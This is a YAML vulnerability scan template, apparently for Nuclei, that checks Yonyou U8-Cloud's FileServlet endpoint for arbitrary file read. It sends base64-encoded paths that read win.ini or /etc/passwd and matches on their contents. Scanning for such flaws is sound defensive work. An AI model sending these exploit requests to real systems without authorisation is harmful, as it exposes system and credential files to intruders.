id: yonyou-u8-cloud-fileservlet-fileread

info:
  name: Yonyou U8-Cloud - File Read
  author: qwtd
  severity: high
  description: |
    用友U8-Cloud接口FileServlet存在任意文件读取漏洞
  metadata:
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

http:
  - raw:
      - |
        GET /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ== HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=L2V0Yy9wYXNzd2Q= HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && contains(body_1,"for 16-bit app support")
      - type: regex
        regex:
          - "root:.*:0:0:"